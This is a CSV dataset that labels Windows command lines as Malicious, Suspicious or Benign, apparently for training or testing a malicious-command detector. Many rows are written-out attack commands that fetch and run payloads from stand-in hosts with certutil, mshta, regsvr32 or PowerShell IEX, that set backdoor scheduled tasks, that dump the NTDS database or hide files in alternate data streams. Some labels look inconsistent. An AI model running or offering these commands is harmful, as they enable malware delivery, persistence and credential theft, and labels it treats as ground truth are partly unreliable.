Prompt,Label,Type
certutil -urlcache -split -f http://evil.com/file.exe,Malicious,command
powershell -enc JABwAHM...,Malicious,command
mshta http://attacker.site/payload.hta,Malicious,command
bitsadmin /transfer job http://malicious.com/file.exe c:\temp\file.exe,Malicious,command
"rundll32 javascript:""..\mshtml.dll,RunHTMLApplication "";alert('owned');",Malicious,command
cmstp.exe /ni /s c:\malicious.inf,Malicious,command
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Malicious,command
"wmic process call create ""powershell.exe -nop -w hidden -enc ...""",Malicious,command
certreq -Post -config http://evil.com/ c:\windows\win.ini output.txt,Malicious,command
ftp -s:cmds.txt,Malicious,command
msiexec /quiet /i evil.msi,Malicious,command
configsecuritypolicy.exe C:\Windows\System32\calc.exe http://malicious.site/backdoor,Malicious,command
expand \\attacker\payload.bat c:\ADS\file.bat,Malicious,command
extrac32.exe /Y /C \\evilhost\share\cmd.txt C:\folder\script.txt,Malicious,command
"schtasks /create /tn backdoor /tr ""powershell.exe -enc ..."" /sc minute",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall evil.dll",Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://evil/script.ps1'),Malicious,command
makecab \webdav\malice.exe C:\folder\payload.cab,Malicious,command
msbuild.exe backdoor.xml,Malicious,command
vbc.exe /target:exe evilcode.vb,Malicious,command
bitsadmin /create /setnotifycmdline job calc.exe NULL,Suspicious,command
cmdkey /list,Suspicious,command
print /D:C:\ADS\Copy.exe C:\ADS\Orig.exe,Suspicious,command
dnscmd /config /serverlevelplugindll \192.168.0.149\dll\backdoor.dll,Suspicious,command
diskshadow > exec calc.exe,Suspicious,command
rundll32.exe advpack.dll LaunchINFSection bad.inf,Suspicious,command
netsh add helper C:\Users\Public\helper.dll,Suspicious,command
tasklist /v,Suspicious,command
"sc \host.domain create ExampleService binpath=""c:\calc.exe""",Suspicious,command
"forfiles /p c:\windows /m notepad.exe /c ""cmd /c start calc.exe""",Suspicious,command
select -ExpandProperty cn,Suspicious,command
powershell Get-DomainUser,Malicious,command
powershell -ExecutionPolicy Bypass -File update.ps1,Suspicious,command
"wmic /node:10.10.10.10 /user:admin /password:pass process call create ""notepad.exe""",Suspicious,command
reg import C:\settings\hkcu.reg,Benign,command
echo Hello World,Benign,command
ipconfig /all,Benign,command
whoami,Benign,command
notepad.exe,Benign,command
taskkill /f /im chrome.exe,Benign,command
explorer.exe C:\Users\Sharveenn\Desktop,Benign,command
copy file.txt backup.txt,Benign,command
mkdir reports,Benign,command
ping 8.8.8.8,Benign,command
shutdown /s /t 0,Benign,command
sc query windefend,Benign,command
netstat -ano,Benign,command
powershell Get-Process,Benign,command
type license.txt,Benign,command
cls,Benign,command
"powershell -command ""Get-EventLog -LogName System -Newest 10""",Benign,command
regsvcs.exe backdoor.dll,Malicious,command
installutil.exe /U malicious.dll,Malicious,command
"powershell -windowstyle hidden -command ""IEX (New-Object Net.WebClient).DownloadString(...)""",Malicious,command
"rundll32.exe mshtml.dll,RunHTMLApplication http://malware.site/payload.hta",Malicious,command
cmd.exe /c echo regsvr32.exe /s /n /u /i:http://host/file.sct scrobj.dll > shell.bat,Malicious,command
"sc create malware binpath=""c:\windows\system32\evil.exe""",Malicious,command
"SyncAppvPublishingServer.vbs ""n;(IEX (New-Object Net.WebClient).DownloadString(...))""",Malicious,command
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:https://evil.site/file.sct"""")""))",Malicious,command
"rundll32.exe url.dll,OpenURL http://bad.site/backdoor",Malicious,command
DataSvcUtil /out:C:\calc.exe /uri:http://evil.ip/hack,Malicious,command
configsecuritypolicy.exe C:\calc.exe http://attacker/hook,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection setup.inf,DefaultInstall",Malicious,command
extrac32.exe C:\malicious.cab c:\payload.txt:evil.exe,Malicious,command
wscript.exe c:\temp\hidden.vbs,Malicious,command
cmd /c powershell -nop -enc JABzAGgAdw...,Malicious,command
ilasm.exe exploit.il /exe,Malicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttp://10.10.10.10/payload.hta,Malicious,command
MpCmdRun.exe -DownloadFile -url http://evil.site/payload.exe -path C:\temp\trojan.exe,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 bad.inf",Malicious,command
dotnet.exe C:\tools\encodedloader.dll,Malicious,command
msconfig,Suspicious,command
regedit.exe,Suspicious,command
taskschd.msc,Suspicious,command
rundll32.exe /S /C {CLSID},Suspicious,command
print /D:evil.txt:copy.exe copy.exe,Suspicious,command
"forfiles /p c:\ /s /m *.exe /c ""cmd /c attrib -h -s @path""",Suspicious,command
ftp -i -n -s:ftp_commands.txt,Suspicious,command
"powershell -Command ""[System.Reflection.Assembly]::Load(...)""",Suspicious,command
rasautou -d shell.dll -p shell -a a -e e,Suspicious,command
jsc.exe script.js,Suspicious,command
eventvwr.exe,Suspicious,command
rundll32.exe ieframe.dll,Suspicious,command
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Suspicious,command
cmd /c start \attackerhost\payload.exe,Suspicious,command
notepad.exe,Benign,command
whoami /groups,Benign,command
taskmgr,Benign,command
control panel,Benign,command
ping www.google.com,Benign,command
tracert 1.1.1.1,Benign,command
systeminfo,Benign,command
net user,Benign,command
chkdsk /f,Benign,command
fsutil behavior query SymlinkEvaluation,Benign,command
start chrome.exe,Benign,command
getmac,Benign,command
winver,Benign,command
netsh interface show interface,Benign,command
copy con test.txt,Benign,command
shutdown /r /t 60,Benign,command
powershell -ep bypass -enc SQBFAFgAIA...,Malicious,command
"rundll32 shell32.dll,Control_RunDLL payload.dll",Malicious,command
sc start malicioussvc,Malicious,command
"mshta vbscript:Execute(""GetObject(""""script:https://evil.site/script.sct"""")"")",Malicious,command
regsvcs.exe /U AllTheThings.dll,Malicious,command
"powershell -w hidden -command ""& {IEX (iwr -uri http://bad.site/script.ps1)}""",Malicious,command
psexec \victim -u user -p pass cmd.exe /c powershell -enc JAB...,Malicious,command
ftp -s:creds.txt,Malicious,command
replace.exe \\malicioushost\payload.exe c:\dest /A,Malicious,command
dnscmd /config /dll \malicious\evil.dll,Malicious,command
"rundll32.exe ieadvpack.dll,RegisterOCX evil.ocx",Malicious,command
regsvr32.exe /u evil.ocx,Malicious,command
makecab \malwarehost\payload.exe C:\out\archive.cab,Malicious,command
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""payload.bat""",Malicious,command
wscript c:\ads\evil.vbs,Malicious,command
cdb.exe -cf exploit.wds -o calc,Malicious,command
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\dump"" q q",Malicious,command
extrac32 C:\payload.cab C:\ADS\file.txt:payload.exe,Malicious,command
diantz.exe \evil\payload.exe C:\folder\hidden.cab,Malicious,command
squirrel.exe --download http://badsite/payload.exe,Malicious,command
control.exe C:\windows\tasks\file.txt:evil.dll,Suspicious,command
pcalua.exe -a calc.exe,Suspicious,command
